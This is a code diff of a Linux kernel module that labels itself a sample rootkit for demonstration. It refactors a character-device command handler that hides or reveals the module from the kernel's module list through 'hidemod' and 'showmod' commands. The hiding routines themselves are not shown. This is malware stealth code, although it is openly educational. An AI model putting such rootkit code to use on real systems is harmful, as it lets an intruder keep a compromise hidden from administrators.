@@ -14,9 +14,9 @@
 #define DEVICE_NAME "rk"
 #define CLASS_NAME "rk"
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Tyler Riedal <riedalsolutions@gmail.com>");
-MODULE_DESCRIPTION("Sample rootkit implementation for demonstrative purposes.");
+// Commands
+#define HIDE_MOD_CMD "hidemod"
+#define SHOW_MOD_CMD "showmod"
 
 static int major_number;
 static struct class *char_class;
@@ -34,8 +34,8 @@ static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 
 // Other prototypes
-void hide_module();
-void show_module();
+void hide_module(void);
+void show_module(void);
 
 static struct file_operations fops =
 {
@@ -63,17 +63,17 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len, 
     char *cmds = (char *)kzalloc(len + 1, GFP_KERNEL);
     
     if (cmds) {
+        char *tok = cmds, *end = cmds;
         copy_from_user(cmds, buffer, len);
-        char *tok = cmds, *end =cmds;
         
         // Get command
         strsep(&end, " ");
         
-        if (strncmp(tok, "hidemod", 7) == 0) {
+        if (strncmp(tok, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD)) == 0) {
             hide_module();
             printk(KERN_INFO "rk: Module hidden.");
         }
-        else if (strncmp(tok, "showmod", 7) == 0) {
+        else if (strncmp(tok, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD)) == 0) {
             show_module();
             printk(KERN_INFO "rk: Module revealed.");
         }           
@@ -81,7 +81,6 @@ static ssize_t device_write(struct file *filep, const char *buffer, size_t len, 
     kfree(cmds);
     return len;
 }
-
 
 static int device_release(struct inode *inodep, struct file *filep)
 {
@@ -171,3 +170,7 @@ static void __exit exit_mod(void)
 
 module_init(init_mod);
 module_exit(exit_mod);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Tyler Riedal <riedalsolutions@gmail.com>");
+MODULE_DESCRIPTION("Sample rootkit implementation for demonstrative purposes.");
